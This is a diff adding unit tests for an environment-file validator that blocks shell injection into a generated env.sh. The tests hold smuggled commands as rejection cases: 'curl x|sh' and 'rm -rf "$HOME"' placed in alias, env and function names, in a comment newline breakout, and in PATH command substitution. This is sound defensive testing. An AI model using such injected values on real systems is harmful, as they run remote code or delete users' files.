@@ -107,3 +107,116 @@ describe("validateEnvData — malformed", () => {
     expect(() => validateEnvData(["a", "b"])).toThrow();
   });
 });
+
+// ── hostile input: shell-injection chokepoint (C1/C2/C3) ───────────────────────
+// validateEnvData is the SINGLE gate for both yaml-load (capture/apply) and
+// PUT /api/env. Names/comments/PATH values that could break out of the generated
+// `~/.config/roost/env.sh` (which the user's shell `source`s) MUST be rejected here.
+
+describe("validateEnvData — C1 reject injectable names", () => {
+  const base = { schemaVersion: 1, aliases: [], env: [], path: [], functions: [] };
+
+  it("rejects an alias name that smuggles a command", () => {
+    expect(() =>
+      validateEnvData({
+        ...base,
+        aliases: [{ kind: "alias", name: "ll=1 && curl x|sh #", value: "ls", enabled: true }],
+      }),
+    ).toThrow(/name/i);
+  });
+
+  it("rejects an env name that smuggles a command", () => {
+    expect(() =>
+      validateEnvData({
+        ...base,
+        env: [{ kind: "env", name: 'X=1; rm -rf "$HOME"; Y', value: "v", secret: false, enabled: true }],
+      }),
+    ).toThrow(/name/i);
+  });
+
+  it("rejects a function name that smuggles a command", () => {
+    expect(() =>
+      validateEnvData({
+        ...base,
+        functions: [{ kind: "function", name: "f(){ curl x|sh; }; g", body: "g() { :; }", enabled: true }],
+      }),
+    ).toThrow(/name/i);
+  });
+
+  it("accepts a normal POSIX identifier name", () => {
+    expect(() =>
+      validateEnvData({
+        ...base,
+        aliases: [{ kind: "alias", name: "_ll2", value: "ls -la", enabled: true }],
+        env: [{ kind: "env", name: "EDITOR", value: "nvim", secret: false, enabled: true }],
+        functions: [{ kind: "function", name: "mkcd", body: "mkcd() { :; }", enabled: true }],
+      }),
+    ).not.toThrow();
+  });
+});
+
+describe("validateEnvData — C2 reject newline in comments", () => {
+  const base = { schemaVersion: 1, aliases: [], env: [], path: [], functions: [] };
+
+  it("rejects an alias comment containing a newline breakout", () => {
+    expect(() =>
+      validateEnvData({
+        ...base,
+        aliases: [{ kind: "alias", name: "ll", value: "ls", enabled: true, comment: "x\nrm -rf ~ #" }],
+      }),
+    ).toThrow(/comment/i);
+  });
+
+  it("rejects an env comment containing a carriage-return newline", () => {
+    expect(() =>
+      validateEnvData({
+        ...base,
+        env: [{ kind: "env", name: "X", value: "y", secret: false, enabled: true, comment: "a\r\nevil" }],
+      }),
+    ).toThrow(/comment/i);
+  });
+
+  it("accepts a single-line comment", () => {
+    expect(() =>
+      validateEnvData({
+        ...base,
+        aliases: [{ kind: "alias", name: "ll", value: "ls", enabled: true, comment: "list files" }],
+      }),
+    ).not.toThrow();
+  });
+});
+
+describe("validateEnvData — C3 reject PATH value injection", () => {
+  const base = { schemaVersion: 1, aliases: [], env: [], path: [], functions: [] };
+
+  it("rejects a PATH value with command substitution", () => {
+    expect(() =>
+      validateEnvData({
+        ...base,
+        path: [{ kind: "path", value: "$(curl x|sh)", position: "prepend", enabled: true }],
+      }),
+    ).toThrow(/path/i);
+  });
+
+  it("rejects a PATH value that closes the quote and runs a command", () => {
+    expect(() =>
+      validateEnvData({
+        ...base,
+        path: [{ kind: "path", value: 'a":evil;"b', position: "append", enabled: true }],
+      }),
+    ).toThrow(/path/i);
+  });
+
+  it("accepts a PATH value referencing a shell variable", () => {
+    expect(() =>
+      validateEnvData({
+        ...base,
+        path: [
+          { kind: "path", value: "$HOME/.local/bin", position: "prepend", enabled: true },
+          { kind: "path", value: "${HOME}/bin", position: "append", enabled: true },
+          { kind: "path", value: "~/go/bin", position: "append", enabled: true },
+        ],
+      }),
+    ).not.toThrow();
+  });
+});
